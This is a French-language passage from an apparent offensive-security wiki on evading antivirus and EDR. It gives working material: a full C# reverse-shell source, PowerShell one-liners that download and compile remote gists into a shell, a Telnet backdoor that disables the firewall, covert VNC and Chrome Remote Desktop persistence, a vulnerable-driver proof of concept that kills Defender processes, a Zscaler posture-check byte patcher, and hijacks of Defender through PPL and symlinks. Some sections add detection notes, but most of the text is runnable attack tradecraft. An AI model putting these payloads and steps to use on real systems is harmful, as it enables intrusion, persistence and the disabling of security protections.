## C# Assembly Reflection

Charger des binaires C# en mémoire est connu depuis un bon moment et c'est toujours une excellente méthode pour exécuter vos outils de post-exploitation sans se faire détecter par l'AV.

Puisque le payload sera chargé directement en mémoire sans toucher le disque, nous n'aurons qu'à nous préoccuper de patcher AMSI pour l'ensemble du processus.

La plupart des frameworks C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) fournissent déjà la capacité d'exécuter des assemblies C# directement en mémoire, mais il existe différentes façons de le faire :

- **Fork\&Run**

Il consiste à **lancer un nouveau processus sacrificiel**, injecter votre code malveillant de post-exploitation dans ce nouveau processus, exécuter votre code malveillant et, une fois terminé, supprimer le nouveau processus. Cela comporte avantages et inconvénients. L'avantage de la méthode fork and run est que l'exécution se produit **en dehors** de notre processus Beacon implant. Cela signifie que si quelque chose dans notre action de post-exploitation tourne mal ou est détecté, il y a une **bien plus grande chance** que notre **implant survive.** L'inconvénient est que vous avez une **plus grande probabilité** d'être détecté par les **détections comportementales**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Il s'agit d'injecter le code malveillant de post-exploitation **dans son propre processus**. Ainsi, vous évitez de créer un nouveau processus qui serait scanné par l'AV, mais l'inconvénient est que si l'exécution de votre payload tourne mal, il y a une **bien plus grande chance** de **perdre votre beacon** car il pourrait planter.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Si vous voulez en savoir plus sur le chargement d'Assembly C#, consultez cet article [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) et leur BOF InlineExecute-Assembly ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Vous pouvez aussi charger des assemblies C# **depuis PowerShell**, regardez [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) et la [vidéo de S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Comme proposé dans [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), il est possible d'exécuter du code malveillant en utilisant d'autres langages en donnant à la machine compromise l'accès **à l'environnement interpréteur installé sur le SMB share contrôlé par l'attaquant**.

En permettant l'accès aux binaires de l'interpréteur et à l'environnement sur le SMB share, vous pouvez **exécuter du code arbitraire dans ces langages en mémoire** de la machine compromise.

Le repo indique : Defender scanne toujours les scripts mais en utilisant Go, Java, PHP, etc., nous avons **plus de flexibilité pour contourner les signatures statiques**. Des tests avec des reverse shells aléatoires non obfusqués dans ces langages ont montré du succès.

## TokenStomping

Token stomping est une technique qui permet à un attaquant de **manipuler le token d'accès ou un produit de sécurité comme un EDR ou l'AV**, leur permettant de réduire ses privilèges de sorte que le processus ne meure pas mais n'ait pas les permissions pour vérifier des activités malveillantes.

Pour empêcher cela, Windows pourrait **empêcher les processus externes** d'obtenir des handles sur les tokens des processus de sécurité.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Comme décrit dans [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), il est facile de déployer Chrome Remote Desktop sur le PC d'une victime puis de l'utiliser pour le prendre en main et maintenir la persistance :
1. Téléchargez depuis https://remotedesktop.google.com/, cliquez sur "Set up via SSH", puis cliquez sur le fichier MSI pour Windows pour le télécharger.
2. Exécutez l'installateur silencieusement sur la victime (admin requis) : `msiexec /i chromeremotedesktophost.msi /qn`
3. Retournez sur la page Chrome Remote Desktop et cliquez sur Next. L'assistant vous demandera alors d'autoriser ; cliquez sur le bouton Authorize pour continuer.
4. Exécutez le paramètre donné avec quelques ajustements : `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Notez le param pin qui permet de définir le pin sans utiliser l'interface graphique).


## Advanced Evasion

L'évasion est un sujet très complexe, parfois vous devez prendre en compte de nombreuses sources de télémétrie dans un seul système, il est donc pratiquement impossible de rester complètement indétecté dans des environnements matures.

Chaque environnement contre lequel vous vous confrontez aura ses propres forces et faiblesses.

Je vous encourage fortement à regarder cette conférence de [@ATTL4S](https://twitter.com/DaniLJ94) pour vous initier aux techniques d'évasion avancées.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Ceci est aussi une autre excellente conférence de [@mariuszbit](https://twitter.com/mariuszbit) sur Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Vérifier quelles parties Defender considère comme malveillantes**

Vous pouvez utiliser [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) qui **supprime des parties du binaire** jusqu'à ce qu'il **découvre quelle partie Defender** trouve comme malveillante et vous la sépare.\
Un autre outil faisant la **même chose est** [**avred**](https://github.com/dobin/avred) avec un service web ouvert proposant le service sur [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Serveur Telnet**

Jusqu'à Windows 10, toutes les versions de Windows étaient livrées avec un **serveur Telnet** que vous pouviez installer (en tant qu'administrateur) en faisant:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Faites-le **démarrer** au démarrage du système et **exécutez-le** maintenant :
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Change telnet port** (stealth) et désactiver le pare-feu:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Téléchargez-le depuis : [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (vous voulez les bin downloads, pas le setup)

**ON THE HOST**: Exécutez _**winvnc.exe**_ et configurez le serveur :

- Activez l'option _Disable TrayIcon_
- Définissez un mot de passe dans _VNC Password_
- Définissez un mot de passe dans _View-Only Password_

Ensuite, déplacez le binaire _**winvnc.exe**_ et le fichier **nouvellement** créé _**UltraVNC.ini**_ dans la **victim**

#### **Reverse connection**

L'**attacker** doit **exécuter depuis** son **host** le binaire `vncviewer.exe -listen 5900` afin d'être **préparé** à capturer une reverse **VNC connection**. Puis, sur la **victim** : démarrez le démon winvnc `winvnc.exe -run` et lancez `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

ATTENTION : Pour rester discret, n'effectuez pas les actions suivantes

- Ne lancez pas `winvnc` s'il est déjà en cours d'exécution, sinon vous déclencherez une [popup](https://i.imgur.com/1SROTTl.png). Vérifiez s'il tourne avec `tasklist | findstr winvnc`
- Ne lancez pas `winvnc` sans `UltraVNC.ini` dans le même répertoire, sinon cela ouvrira [la fenêtre de configuration](https://i.imgur.com/rfMQWcf.png)
- N'exécutez pas `winvnc -h` pour l'aide, sinon vous déclencherez une [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Téléchargez-le depuis : [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
À l'intérieur de GreatSCT :
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Maintenant **démarrez le lister** avec `msfconsole -r file.rc` et **exécutez** le **xml payload** avec :
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Le défenseur actuel terminera le processus très rapidement.**

### Compiler notre propre reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Premier C# Revershell

Compilez-le avec :
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Utilisez-le avec :
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# en utilisant le compilateur
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Téléchargement et exécution automatiques :
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Liste d'obfuscateurs C# : [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Exemple d'utilisation de python pour build injectors :

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Autres outils
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603 a utilisé un petit utilitaire console connu sous le nom de **Antivirus Terminator** pour désactiver les protections endpoint avant de déployer un ransomware. L'outil apporte son **propre driver vulnérable mais *signé*** et l'abuse pour exécuter des opérations privilégiées au niveau kernel que même les services AV en Protected-Process-Light (PPL) ne peuvent bloquer.

Points clés
1. **Signed driver**: Le fichier déposé sur le disque est `ServiceMouse.sys`, mais le binaire est le driver légitimement signé `AToolsKrnl64.sys` provenant du “System In-Depth Analysis Toolkit” d'Antiy Labs. Parce que le driver porte une signature Microsoft valide, il se charge même lorsque Driver-Signature-Enforcement (DSE) est activé.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
La première ligne enregistre le driver comme un **service kernel** et la seconde le démarre afin que `\\.\ServiceMouse` devienne accessible depuis l'espace utilisateur.
3. **IOCTLs exposed by the driver**
| IOCTL code | Fonctionnalité                              |
|-----------:|---------------------------------------------|
| `0x99000050` | Terminer un processus arbitraire par PID (utilisé pour tuer les services Defender/EDR) |
| `0x990000D0` | Supprimer un fichier quelconque sur le disque |
| `0x990001D0` | Décharger le driver et supprimer le service |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**:  BYOVD évite complètement les protections en user-mode ; le code s'exécutant dans le kernel peut ouvrir des processus *protected*, les terminer ou altérer des objets kernel indépendamment de PPL/PP, ELAM ou d'autres mécanismes de durcissement.

Detection / Mitigation
•  Activez la liste de blocage des drivers vulnérables de Microsoft (`HVCI`, `Smart App Control`) afin que Windows refuse de charger `AToolsKrnl64.sys`.  
•  Surveillez la création de nouveaux services *kernel* et alertez lorsqu'un driver est chargé depuis un répertoire world-writable ou n'apparaît pas sur la allow-list.  
•  Surveillez les handles en user-mode vers des objets device personnalisés suivis d'appels `DeviceIoControl` suspects.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler’s **Client Connector** applique des règles de posture device localement et s'appuie sur Windows RPC pour communiquer les résultats aux autres composants. Deux choix de conception faibles rendent un contournement complet possible :

1. L'évaluation de la posture a lieu **entièrement côté client** (un booléen est envoyé au serveur).  
2. Les endpoints RPC internes vérifient seulement que l'exécutable qui se connecte est **signé par Zscaler** (via `WinVerifyTrust`).

En **patchant quatre binaires signés sur disque** les deux mécanismes peuvent être neutralisés :

| Binary | Logique originale patchée | Résultat |
|--------|---------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Retourne toujours `1` donc chaque vérification est conforme |
| `ZSAService.exe` | Appel indirect à `WinVerifyTrust` | NOP-ed ⇒ n'importe quel processus (même non signé) peut se lier aux pipes RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Remplacée par `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Vérifications d'intégrité sur le tunnel | Court-circuitées |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Après avoir remplacé les fichiers originaux et redémarré la pile de services :

* **Tous** les contrôles de posture affichent **vert/conforme**.
* Des binaires non signés ou modifiés peuvent ouvrir les points de terminaison RPC de pipe nommé (e.g. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* L'hôte compromis obtient un accès sans restriction au réseau interne défini par les politiques Zscaler.

Cette étude de cas démontre comment des décisions de confiance purement côté client et de simples vérifications de signature peuvent être contournées avec quelques patches d'octets.

## Abuser Protected Process Light (PPL) pour altérer AV/EDR avec LOLBINs

Protected Process Light (PPL) impose une hiérarchie signataire/niveau de sorte que seuls des processus protégés de niveau égal ou supérieur peuvent se modifier mutuellement. Dans un contexte offensif, si vous pouvez lancer légitimement un binaire compatible PPL et contrôler ses arguments, vous pouvez convertir une fonctionnalité bénigne (par ex., journalisation) en un primitive d'écriture contraint, soutenu par PPL, visant les répertoires protégés utilisés par AV/EDR.

What makes a process run as PPL
- The target EXE (and any loaded DLLs) must be signed with a PPL-capable EKU.
- The process must be created with CreateProcess using the flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- A compatible protection level must be requested that matches the signer of the binary (e.g., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` for anti-malware signers, `PROTECTION_LEVEL_WINDOWS` for Windows signers). Wrong levels will fail at creation.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Le binaire système signé `C:\Windows\System32\ClipUp.exe` se lance lui-même et accepte un paramètre pour écrire un fichier de log vers un chemin spécifié par l'appelant.
- Lorsqu'il est lancé comme processus PPL, l'écriture du fichier se fait avec le support PPL.
- ClipUp ne peut pas analyser les chemins contenant des espaces ; utilisez des chemins courts 8.3 pour pointer vers des emplacements normalement protégés.

8.3 short path helpers
- Lister les noms courts : `dir /x` dans chaque répertoire parent.
- Dériver le chemin court dans cmd : `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Lancer le LOLBIN capable de PPL (ClipUp) avec `CREATE_PROTECTED_PROCESS` en utilisant un lanceur (par exemple CreateProcessAsPPL).
2) Passer l'argument de chemin de log de ClipUp pour forcer la création d'un fichier dans un répertoire AV protégé (par ex. Defender Platform). Utiliser des noms courts 8.3 si nécessaire.
3) Si le binaire cible est normalement ouvert/verrouillé par l'AV pendant son exécution (par ex. MsMpEng.exe), planifier l'écriture au démarrage avant que l'AV ne démarre en installant un service auto-start qui s'exécute de façon fiable plus tôt. Validez l'ordre de démarrage avec Process Monitor (boot logging).
4) Au redémarrage, l'écriture soutenue par PPL a lieu avant que l'AV ne verrouille ses binaires, corrompant le fichier cible et empêchant le démarrage.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes et contraintes
- Vous ne pouvez pas contrôler le contenu que ClipUp écrit au-delà de l'emplacement ; cette primitive convient à la corruption plutôt qu'à une injection de contenu précise.
- Nécessite les privilèges local admin/SYSTEM pour installer/démarrer un service et une fenêtre de redémarrage.
- Le timing est critique : la cible ne doit pas être ouverte ; l'exécution au démarrage évite les verrous de fichiers.

Détections
- Création de processus de `ClipUp.exe` avec des arguments inhabituels, surtout parenté par des lanceurs non standard, autour du démarrage.
- Nouveaux services configurés pour démarrer automatiquement des binaires suspects et démarrant systématiquement avant Defender/AV. Examiner la création/modification de services précédant les échecs de démarrage de Defender.
- Surveillance de l'intégrité des fichiers sur les binaires de Defender/les répertoires Platform ; créations/modifications de fichiers inattendues par des processus avec des flags protected-process.
- Télémetrie ETW/EDR : rechercher des processus créés avec `CREATE_PROTECTED_PROCESS` et une utilisation anormale des niveaux PPL par des binaires non-AV.

Atténuations
- WDAC/Code Integrity : restreindre quels binaires signés peuvent s'exécuter en tant que PPL et sous quels parents ; bloquer l'invocation de ClipUp hors des contextes légitimes.
- Hygiène des services : restreindre la création/modification des services à démarrage automatique et surveiller les manipulations de l'ordre de démarrage.
- S'assurer que la protection contre la falsification de Defender et les protections de démarrage précoce sont activées ; enquêter sur les erreurs de démarrage indiquant une corruption binaire.
- Envisager de désactiver la génération de noms courts 8.3 sur les volumes hébergeant les outils de sécurité si compatible avec votre environnement (tester soigneusement).

Références pour PPL et tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- Référence EKU: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (validation de l'ordre): https://learn.microsoft.com/sysinternals/downloads/procmon
- Lanceur CreateProcessAsPPL: https://github.com/2x7EQ13/CreateProcessAsPPL
- Article technique (ClipUp + PPL + altération de l'ordre de démarrage): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Altération de Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender choisit la plateforme à partir de laquelle il s'exécute en énumérant les sous-dossiers sous :
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Il sélectionne le sous-dossier ayant la chaîne de version lexicographiquement la plus élevée (p. ex., `4.18.25070.5-0`), puis démarre les processus de service Defender à partir de là (en mettant à jour les chemins de service/registre en conséquence). Cette sélection fait confiance aux entrées de répertoire, y compris les points de reparse de répertoire (symlinks). Un administrateur peut exploiter cela pour rediriger Defender vers un chemin inscriptible par l'attaquant et réaliser un DLL sideloading ou perturber le service.

Prérequis
- Administrateur local (nécessaire pour créer des répertoires/symlinks sous le dossier Platform)
- Capacité à redémarrer ou déclencher la re-sélection de la plateforme Defender (redémarrage du service au démarrage)
- Seuls des outils intégrés sont nécessaires (mklink)

Pourquoi cela fonctionne
- Defender bloque les écritures dans ses propres dossiers, mais sa sélection de la plateforme fait confiance aux entrées de répertoire et choisit la version la plus élevée lexicographiquement sans valider que la cible résout vers un chemin protégé/de confiance.

Étapes pas à pas (exemple)
1) Préparer un clone inscriptible du dossier Platform actuel, par ex. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Créez un symlink de répertoire de version supérieure à l'intérieur de Platform pointant vers votre dossier :
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Sélection du déclencheur (redémarrage recommandé) :
```cmd
shutdown /r /t 0
```
4) Vérifier que MsMpEng.exe (WinDefend) s'exécute depuis le chemin redirigé :
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Vous devriez observer le nouveau chemin de processus sous `C:\TMP\AV\` et la configuration/registre du service reflétant cet emplacement.

Options post-exploitation
- DLL sideloading/code execution: Déposer/remplacer des DLLs que Defender charge depuis son répertoire d'application pour exécuter du code dans les processus de Defender. Voir la section ci‑dessus : [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Supprimez le version-symlink afin qu'au prochain démarrage le chemin configuré ne se résolve pas et que Defender échoue à démarrer:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Notez que cette technique n'offre pas d'élévation de privilèges en soi ; elle nécessite des droits d'administrateur.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Les red teams peuvent déplacer l'évasion à l'exécution hors de l'implant C2 et dans le module cible lui‑même en hookant son Import Address Table (IAT) et en routant des APIs sélectionnées via attacker-controlled, position‑independent code (PIC). Cela généralise l'évasion au‑delà de la petite surface d'API que nombre de kits exposent (p.ex., CreateProcessA), et étend les mêmes protections aux BOFs et post‑exploitation DLLs.

High-level approach
- Placer un PIC blob à côté du module cible en utilisant un reflective loader (préfixé ou en tant que module compagnon). Le PIC doit être autonome et position‑independent.
- Au chargement de la DLL hôte, parcourir son IMAGE_IMPORT_DESCRIPTOR et patcher les entrées IAT pour les imports ciblés (p.ex., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) afin qu'elles pointent vers de thin PIC wrappers.
- Each PIC wrapper executes evasions before tail‑calling the real API address. Typical evasions include:
- Memory mask/unmask around the call (e.g., encrypt beacon regions, RWX→RX, change page names/permissions) then restore post‑call.
- Call‑stack spoofing: construct a benign stack and transition into the target API so call‑stack analysis resolves to expected frames.
- For compatibility, export an interface so an Aggressor script (or equivalent) can register which APIs to hook for Beacon, BOFs and post‑ex DLLs.

Why IAT hooking here
- Works for any code that uses the hooked import, without modifying tool code or relying on Beacon to proxy specific APIs.
- Covers post‑ex DLLs: hooking LoadLibrary* lets you intercept module loads (e.g., System.Management.Automation.dll, clr.dll) and apply the same masking/stack evasion to their API calls.
- Restores reliable use of process‑spawning post‑ex commands against call‑stack–based detections by wrapping CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Remarques
- Appliquez le patch après les relocations/ASLR et avant la première utilisation de l'import. Reflective loaders like TitanLdr/AceLdr démontrent le hooking durant DllMain du module chargé.
- Gardez les wrappers petits et PIC-safe ; résolvez la vraie API via la valeur IAT originale que vous avez capturée avant le patch ou via LdrGetProcedureAddress.
- Utilisez des transitions RW → RX pour PIC et évitez de laisser des pages writable+executable.

Call‑stack spoofing stub
- Les Draugr‑style PIC stubs construisent une fausse chaîne d'appels (adresses de retour vers des modules bénins) puis pivotent vers l'API réelle.
- Cela défait les détections qui s'attendent à des piles canoniques provenant de Beacon/BOFs vers des APIs sensibles.
- Associez avec stack cutting/stack stitching pour atterrir à l'intérieur des frames attendues avant le prologue de l'API.

Intégration opérationnelle
- Préfixez le reflective loader aux DLLs post‑ex pour que le PIC et les hooks s'initialisent automatiquement lors du chargement de la DLL.
- Utilisez un Aggressor script pour enregistrer les APIs cibles afin que Beacon et BOFs bénéficient de façon transparente du même chemin d'évasion sans modification de code.

Considérations Détection/DFIR
- IAT integrity : entrées qui résolvent vers des adresses non‑image (heap/anon) ; vérification périodique des pointeurs d'import.
- Anomalies de pile : adresses de retour n'appartenant pas aux images chargées ; transitions abruptes vers PIC non‑image ; ascendance RtlUserThreadStart incohérente.
- Télémétrie du loader : écritures in‑process sur l'IAT, activité précoce dans DllMain qui modifie les import thunks, régions RX inattendues créées au chargement.
- Image‑load evasion : si hooking LoadLibrary*, surveillez les chargements suspects d'assemblies automation/clr corrélés avec des événements de memory masking.

Blocs de construction et exemples associés
- Reflective loaders qui effectuent IAT patching lors du chargement (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) et stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## SantaStealer Tradecraft pour Fileless Evasion et Credential Theft

SantaStealer (aka BluelineStealer) illustre comment les info-stealers modernes combinent AV bypass, anti-analysis et credential access dans un même workflow.

### Keyboard layout gating & sandbox delay

